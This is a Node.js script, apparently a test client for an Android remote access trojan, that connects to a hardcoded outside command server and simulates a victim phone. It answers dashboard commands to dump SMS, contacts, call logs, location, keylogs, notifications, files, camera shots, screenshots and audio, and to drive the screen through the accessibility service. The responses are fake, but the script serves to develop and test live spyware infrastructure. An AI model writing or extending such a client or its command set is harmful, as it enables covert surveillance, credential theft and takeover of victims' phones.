'use strict';

/**
 * Android Device Simulator
 * Mimics the real Android app's SocketManager.java behavior
 * Connects to: sjc1.clusters.zeabur.com:21400
 * Protocol: JSON over TCP with newline delimiters
 */

const net    = require('net');
const crypto = require('crypto');
const os     = require('os');

// ──────────────────────────────────────────────
// CONFIG  (matches Constants.java exactly)
// ──────────────────────────────────────────────
const TCP_HOST          = 'sjc1.clusters.zeabur.com';
const TCP_PORT          = 21400;
const RECONNECT_DELAY   = 3000;
const HEARTBEAT_INTERVAL= 20000;

// ──────────────────────────────────────────────
// SIMULATED DEVICE IDENTITY
// ──────────────────────────────────────────────
const DEVICE_ID = 'SIM-' + crypto.randomBytes(4).toString('hex').toUpperCase();

const DEVICE_INFO = {
  name:           'Simulator-Phone',
  model:          'Pixel 8 Pro (SIM)',
  manufacturer:   'Google',
  androidVersion: '14',
  sdk:            34,
  brand:          'Google'
};

// Simulated state
let accessibilityEnabled = true;  // Simulator always has accessibility
let recordingActive      = false;
let recordingFile        = null;
const keylogs            = [];
const notifications      = [
  { app: 'com.whatsapp',  title: 'WhatsApp', text: 'Hey, are you there?',   time: Date.now() - 5000  },
  { app: 'com.instagram', title: 'Instagram', text: 'You have 5 new likes', time: Date.now() - 12000 }
];

// ──────────────────────────────────────────────
// TCP CLIENT
// ──────────────────────────────────────────────
let socket        = null;
let connected     = false;
let running       = true;
let buf           = '';
let heartbeatTimer= null;

function log(tag, msg) {
  const ts = new Date().toISOString().slice(11, 23);
  console.log(`[${ts}][${tag}] ${msg}`);
}

function send(event, data) {
  if (socket && connected) {
    const msg = JSON.stringify({ event, data }) + '\n';
    socket.write(msg);
  }
}

function registerDevice() {
  send('device:register', {
    deviceId:   DEVICE_ID,
    userId:     '',
    deviceInfo: DEVICE_INFO
  });
  log('REG', `Registered as ${DEVICE_ID}`);
}

function sendHeartbeat() {
  send('device:heartbeat', { deviceId: DEVICE_ID });
}

function sendPong() {
  send('device:pong', { deviceId: DEVICE_ID });
}

function startHeartbeat() {
  stopHeartbeat();
  heartbeatTimer = setInterval(sendHeartbeat, HEARTBEAT_INTERVAL);
}

function stopHeartbeat() {
  if (heartbeatTimer) { clearInterval(heartbeatTimer); heartbeatTimer = null; }
}

function sendResponse(commandId, result) {
  send('command:response', { commandId, response: JSON.stringify(result) });
}

function sendError(commandId, msg) {
  send('command:response', { commandId, error: msg });
}

// ──────────────────────────────────────────────
// COMMAND HANDLERS  (simulate every command)
// ──────────────────────────────────────────────
function handleCommand(commandId, command, params) {
  log('CMD', `← ${command} [${commandId}]`);

  try {
    const result = execute(command, params || {});
    sendResponse(commandId, result);
    log('CMD', `→ ${command} OK`);
  } catch (err) {
    sendError(commandId, err.message);
    log('CMD', `→ ${command} ERROR: ${err.message}`);
  }
}

function execute(command, p) {
  switch (command) {

    case 'ping':
      return { success: true, pong: true, timestamp: Date.now(), deviceId: DEVICE_ID };

    case 'get_device_info':
      return {
        success: true,
        deviceId: DEVICE_ID,
        name: DEVICE_INFO.name,
        model: DEVICE_INFO.model,
        manufacturer: DEVICE_INFO.manufacturer,
        androidVersion: DEVICE_INFO.androidVersion,
        sdk: DEVICE_INFO.sdk,
        brand: DEVICE_INFO.brand,
        screenResolution: '1344x2992',
        ram: '12 GB',
        storage: '256 GB',
        battery: 85,
        imei: '353000000000001'
      };

    case 'get_battery_info':
      return { success: true, level: Math.floor(60 + Math.random() * 35), isCharging: Math.random() > 0.5, temperature: 28 + Math.random() * 4, voltage: 4200 };

    case 'get_network_info':
      return { success: true, type: 'WIFI', ssid: 'SimulatedNetwork', signalStrength: -55, ip: '192.168.1.' + Math.floor(2 + Math.random() * 100), mac: 'AA:BB:CC:DD:EE:FF' };

    case 'get_wifi_networks':
      return { success: true, networks: [
        { ssid: 'HomeNetwork', rssi: -45, secured: true },
        { ssid: 'OfficeWifi',  rssi: -67, secured: true },
        { ssid: 'PublicWifi',  rssi: -80, secured: false }
      ]};

    case 'get_system_info':
      return { success: true, uptime: Math.floor(process.uptime()), totalRam: 12288, freeRam: 3200, cpuUsage: Math.floor(10 + Math.random() * 40), kernel: '5.15.0-android14' };

    case 'get_location':
      return { success: true, latitude: 37.4219983 + (Math.random() - 0.5) * 0.01, longitude: -122.084 + (Math.random() - 0.5) * 0.01, accuracy: 5.0 + Math.random() * 10, provider: 'gps', altitude: 10.5 };

    case 'vibrate':
      return { success: true, message: `Vibrated for ${p.duration || 500}ms` };

    case 'play_sound':
      return { success: true, message: 'Sound played' };

    case 'get_clipboard':
      return { success: true, text: 'Simulated clipboard content - Hello World!' };

    case 'set_clipboard':
      return { success: true, message: `Clipboard set to: "${p.text}"` };

    case 'get_installed_apps':
      return { success: true, apps: [
        { name: 'WhatsApp',  packageName: 'com.whatsapp',   version: '2.23.25', system: false },
        { name: 'Instagram', packageName: 'com.instagram',  version: '312.0',   system: false },
        { name: 'Chrome',    packageName: 'com.android.chrome', version: '120.0', system: false },
        { name: 'Settings',  packageName: 'com.android.settings', version: '14', system: true  },
        { name: 'Camera',    packageName: 'com.android.camera2',  version: '14', system: true  },
        { name: 'Gmail',     packageName: 'com.google.android.gm', version: '2024.01', system: false },
      ]};

    case 'get_all_sms': {
      const limit = parseInt(p.limit) || 100;
      const smsList = [];
      for (let i = 0; i < Math.min(limit, 5); i++) {
        smsList.push({ id: String(i + 1), address: '+1555000' + i, body: `Simulated SMS #${i + 1}`, date: Date.now() - i * 3600000, type: i % 2 === 0 ? 'inbox' : 'sent' });
      }
      return { success: true, messages: smsList, count: smsList.length };
    }

    case 'get_sms_from_number':
      return { success: true, messages: [
        { id: '101', address: p.phoneNumber, body: 'Hey from simulator!', date: Date.now() - 1000, type: 'inbox' }
      ], count: 1 };

    case 'send_sms':
      return { success: true, message: `SMS sent to ${p.phoneNumber}: "${p.message}"` };

    case 'delete_sms':
      return { success: true, message: `SMS ${p.smsId} deleted` };

    case 'get_all_contacts':
      return { success: true, contacts: [
        { id: '1', name: 'Alice Smith',    phone: '+15550001001', email: 'alice@example.com' },
        { id: '2', name: 'Bob Johnson',    phone: '+15550001002', email: 'bob@example.com'   },
        { id: '3', name: 'Charlie Brown',  phone: '+15550001003', email: null },
        { id: '4', name: 'Diana Prince',   phone: '+15550001004', email: 'diana@example.com' },
      ], count: 4 };

    case 'search_contacts':
      return { success: true, contacts: [
        { id: '1', name: 'Search Result for: ' + p.query, phone: '+15550001001' }
      ], count: 1 };

    case 'get_all_call_logs': {
      const limit = parseInt(p.limit) || 100;
      const logs = [];
      const types = ['incoming','outgoing','missed'];
      for (let i = 0; i < Math.min(limit, 5); i++) {
        logs.push({ id: String(i + 1), number: '+1555000' + i, type: types[i % 3], duration: Math.floor(Math.random() * 300), date: Date.now() - i * 7200000 });
      }
      return { success: true, callLogs: logs, count: logs.length };
    }

    case 'get_call_logs_by_type':
      return { success: true, callLogs: [{ id: '1', number: '+15550001', type: ['','incoming','outgoing','missed'][parseInt(p.callType)||1], duration: 120, date: Date.now() }], count: 1 };

    case 'get_call_logs_from_number':
      return { success: true, callLogs: [{ id: '1', number: p.phoneNumber, type: 'incoming', duration: 90, date: Date.now() }], count: 1 };

    case 'get_call_statistics':
      return { success: true, total: 42, incoming: 18, outgoing: 20, missed: 4, totalDuration: 8340 };

    case 'get_available_cameras':
      return { success: true, cameras: [
        { id: '0', facing: 'BACK',  megapixels: 50, hasFlash: true  },
        { id: '1', facing: 'FRONT', megapixels: 10, hasFlash: false }
      ]};

    case 'take_photo':
      return { success: true, message: `Photo taken from camera ${p.cameraId || 0} at quality ${p.quality || 'high'}`, imageBase64: '/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAABAAEDASIAAhEBAxEB/8QAFAABAAAAAAAAAAAAAAAAAAAACf/EABQQAQAAAAAAAAAAAAAAAAAAAAD/xAAUAQEAAAAAAAAAAAAAAAAAAAAA/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEQMRAD8AJQAB/9k=' };

    case 'take_screenshot':
      return { success: true, message: 'Screenshot captured', width: 1080, height: 2400, imageBase64: 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==' };

    case 'list_files': {
      const path = p.path || '/sdcard';
      return { success: true, path, files: [
        { name: 'DCIM',      type: 'directory', size: 0,       modified: Date.now() - 86400000 },
        { name: 'Download',  type: 'directory', size: 0,       modified: Date.now() - 3600000  },
        { name: 'Documents', type: 'directory', size: 0,       modified: Date.now() - 7200000  },
        { name: 'notes.txt', type: 'file',      size: 1024,    modified: Date.now() - 1800000  },
        { name: 'photo.jpg', type: 'file',      size: 2048000, modified: Date.now() - 900000   },
      ]};
    }

    case 'read_file':
      return { success: true, filePath: p.filePath, content: p.asBase64 === 'true' ? 'U2ltdWxhdGVkIGZpbGUgY29udGVudA==' : 'Simulated file content from simulator', size: 32 };

    case 'search_files':
      return { success: true, results: [
        { name: p.query + '_match.txt', path: p.directory + '/' + p.query + '_match.txt', size: 512, type: 'file' }
      ], count: 1 };

    case 'get_file_info':
      return { success: true, filePath: p.filePath, size: 1024, modified: Date.now() - 3600000, exists: true, isDirectory: false };

    case 'delete_file':
      return { success: true, message: `Deleted: ${p.filePath}` };

    case 'copy_file':
      return { success: true, message: `Copied ${p.sourcePath} → ${p.destPath}` };

    case 'move_file':
      return { success: true, message: `Moved ${p.sourcePath} → ${p.destPath}` };

    case 'create_directory':
      return { success: true, message: `Directory created: ${p.path}` };

    case 'start_recording':
      if (recordingActive) return { success: false, error: 'Already recording' };
      recordingActive = true;
      recordingFile   = p.filename || `rec_${Date.now()}.mp4`;
      return { success: true, message: `Recording started: ${recordingFile}` };

    case 'stop_recording':
      if (!recordingActive) return { success: false, error: 'Not recording' };
      recordingActive = false;
      const file = recordingFile; recordingFile = null;
      return { success: true, message: `Recording saved: ${file}`, filePath: '/sdcard/Recordings/' + file };

    case 'get_recording_status':
      return { success: true, isRecording: recordingActive, currentFile: recordingFile };

    case 'list_recordings':
      return { success: true, recordings: [
        { name: 'rec_001.mp4', path: '/sdcard/Recordings/rec_001.mp4', size: 2048000, duration: 30 },
        { name: 'rec_002.mp4', path: '/sdcard/Recordings/rec_002.mp4', size: 5120000, duration: 60 },
      ]};

    case 'get_audio':
      return { success: true, filePath: p.filePath, audioBase64: 'UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=' };

    case 'delete_recording':
      return { success: true, message: `Recording deleted: ${p.filePath}` };

    case 'get_keylogs': {
      const limit = parseInt(p.limit) || 100;
      const fakeKeys = ['Hello World', 'password123', 'search query', 'bank.com', 'username: john'].slice(0, limit);
      return { success: true, keylogs: fakeKeys.map((text, i) => ({ text, app: 'com.android.browser', timestamp: Date.now() - i * 60000 })), count: fakeKeys.length };
    }

    case 'clear_keylogs':
      keylogs.length = 0;
      return { success: true, message: 'Keylogs cleared' };

    case 'get_notifications':
      return { success: true, notifications, count: notifications.length };

    case 'get_notifications_from_app':
      return { success: true, notifications: notifications.filter(n => n.app === p.packageName), count: notifications.filter(n => n.app === p.packageName).length };

    case 'clear_notifications':
      return { success: true, message: 'Notifications cleared' };

    // ── Accessibility commands ──────────────────────────────────────
    case 'touch':
      if (!accessibilityEnabled) return { success: false, error: 'Accessibility service not running' };
      return { success: true, message: `Touched at (${p.x}, ${p.y}) for ${p.duration || 100}ms` };

    case 'swipe':
      if (!accessibilityEnabled) return { success: false, error: 'Accessibility service not running' };
      return { success: true, message: `Swiped (${p.startX},${p.startY}) → (${p.endX},${p.endY}) in ${p.duration || 300}ms` };

    case 'press_back':
      if (!accessibilityEnabled) return { success: false, error: 'Accessibility service not running' };
      return { success: true, message: 'Back button pressed' };

    case 'press_home':
      if (!accessibilityEnabled) return { success: false, error: 'Accessibility service not running' };
      return { success: true, message: 'Home button pressed' };

    case 'press_recents':
      if (!accessibilityEnabled) return { success: false, error: 'Accessibility service not running' };
      return { success: true, message: 'Recents button pressed' };

    case 'open_notifications':
      if (!accessibilityEnabled) return { success: false, error: 'Accessibility service not running' };
      return { success: true, message: 'Notification shade opened' };

    case 'scroll_up':
      if (!accessibilityEnabled) return { success: false, error: 'Accessibility service not running' };
      return { success: true, message: 'Scrolled up' };

    case 'scroll_down':
      if (!accessibilityEnabled) return { success: false, error: 'Accessibility service not running' };
      return { success: true, message: 'Scrolled down' };

    case 'read_screen':
      if (!accessibilityEnabled) return { success: false, error: 'Accessibility service not running' };
      return { success: true, elements: [
        { text: 'Home Screen', type: 'LAYOUT', clickable: false, bounds: '0,0,1080,2400' },
        { text: 'Clock 09:41',  type: 'TEXT',   clickable: false, bounds: '440,60,640,120' },
        { text: 'App Drawer',   type: 'BUTTON', clickable: true,  bounds: '460,2200,620,2340' }
      ], currentApp: 'com.android.launcher3' };

    case 'find_by_text':
      if (!accessibilityEnabled) return { success: false, error: 'Accessibility service not running' };
      return { success: true, found: true, elements: [
        { text: p.text, type: 'TEXT', clickable: false, bounds: '100,200,400,240' }
      ]};

    case 'get_current_app':
      if (!accessibilityEnabled) return { success: false, error: 'Accessibility service not running' };
      return { success: true, packageName: 'com.android.launcher3', className: 'com.android.launcher3.Launcher', activityName: 'Launcher' };

    case 'get_clickable_elements':
      if (!accessibilityEnabled) return { success: false, error: 'Accessibility service not running' };
      return { success: true, elements: [
        { text: 'OK',     type: 'BUTTON', clickable: true, bounds: '800,1800,1000,1900' },
        { text: 'Cancel', type: 'BUTTON', clickable: true, bounds: '80,1800,300,1900'   }
      ], count: 2 };

    case 'get_input_fields':
      if (!accessibilityEnabled) return { success: false, error: 'Accessibility service not running' };
      return { success: true, fields: [
        { hint: 'Username', type: 'TEXT',     editable: true, bounds: '100,400,980,480' },
        { hint: 'Password', type: 'PASSWORD', editable: true, bounds: '100,520,980,600' }
      ], count: 2 };

    case 'get_accessibility_status':
      return { success: true, enabled: accessibilityEnabled, message: accessibilityEnabled ? 'Accessibility service is running' : 'Accessibility service is NOT running' };

    case 'open_quick_settings':
      if (!accessibilityEnabled) return { success: false, error: 'Accessibility service not running' };
      return { success: true, action: 'quick_settings', message: 'Quick settings panel opened' };

    case 'input_text':
      if (!accessibilityEnabled) return { success: false, error: 'Accessibility service not running' };
      return { success: true, text: p.text, message: `Typed "${p.text}" into focused field` };

    case 'click_by_text':
      if (!accessibilityEnabled) return { success: false, error: 'Accessibility service not running' };
      return { success: true, text: p.text, message: `Clicked element with text: "${p.text}"` };

    default:
      return { success: false, error: `Unknown command: ${command}` };
  }
}

// ──────────────────────────────────────────────
// PROCESS INCOMING MESSAGES
// ──────────────────────────────────────────────
function processMessage(line) {
  let msg;
  try { msg = JSON.parse(line); } catch (_) { return; }

  const { event, data } = msg;

  if (event === 'device:ping') {
    sendPong();
    return;
  }

  if (event === 'device:registered') {
    log('REG', `Server acknowledged registration ✓`);
    return;
  }

  if (event === 'command:execute' && data) {
    const { commandId, command, params } = data;
    handleCommand(commandId, command, params);
    return;
  }

  log('MSG', `Unhandled event: ${event}`);
}

// ──────────────────────────────────────────────
// CONNECTION MANAGEMENT
// ──────────────────────────────────────────────
function connectToServer() {
  log('TCP', `Connecting to ${TCP_HOST}:${TCP_PORT}...`);

  socket = net.createConnection({ host: TCP_HOST, port: TCP_PORT });

  socket.setEncoding('utf8');
  socket.setKeepAlive(true);

  socket.on('connect', () => {
    connected = true;
    buf = '';
    log('TCP', `Connected! Device ID: ${DEVICE_ID}`);
    printPhoneUI();
    registerDevice();
    startHeartbeat();
  });

  socket.on('data', (chunk) => {
    buf += chunk;
    let idx;
    while ((idx = buf.indexOf('\n')) !== -1) {
      const line = buf.slice(0, idx).trim();
      buf = buf.slice(idx + 1);
      if (line) processMessage(line);
    }
  });

  socket.on('close', () => {
    connected = false;
    stopHeartbeat();
    log('TCP', `Disconnected. Reconnecting in ${RECONNECT_DELAY}ms...`);
    if (running) setTimeout(connectToServer, RECONNECT_DELAY);
  });

  socket.on('error', (err) => {
    log('TCP', `Error: ${err.message}`);
    connected = false;
  });
}

// ──────────────────────────────────────────────
// VISUAL PHONE UI  (console)
// ──────────────────────────────────────────────
function printPhoneUI() {
  console.log('\n');
  console.log('  ╔══════════════════════════════╗');
  console.log('  ║      SIMULATED ANDROID PHONE     ║');
  console.log('  ╠══════════════════════════════╣');
  console.log(`  ║  Model : ${DEVICE_INFO.model.padEnd(22)}║`);
  console.log(`  ║  OS    : Android ${DEVICE_INFO.androidVersion.padEnd(14)}║`);
  console.log(`  ║  ID    : ${DEVICE_ID.padEnd(22)}║`);
  console.log(`  ║  Server: ${TCP_HOST.slice(0,22).padEnd(22)}║`);
  console.log(`  ║  Port  : ${String(TCP_PORT).padEnd(22)}║`);
  console.log('  ╠══════════════════════════════╣');
  console.log('  ║  ✅ Accessibility Service ON      ║');
  console.log('  ║  ✅ All Permissions Granted        ║');
  console.log('  ║  ✅ Background Service Running     ║');
  console.log('  ╚══════════════════════════════╝');
  console.log('  Waiting for commands from dashboard...\n');
}

// ──────────────────────────────────────────────
// START
// ──────────────────────────────────────────────
console.log('═══════════════════════════════════════');
console.log('   Android Device Simulator');
console.log(`   Target: ${TCP_HOST}:${TCP_PORT}`);
console.log('═══════════════════════════════════════');

connectToServer();

process.on('SIGINT', () => {
  running = false;
  stopHeartbeat();
  if (socket) socket.destroy();
  log('SHUTDOWN', 'Simulator stopped');
  process.exit(0);
});
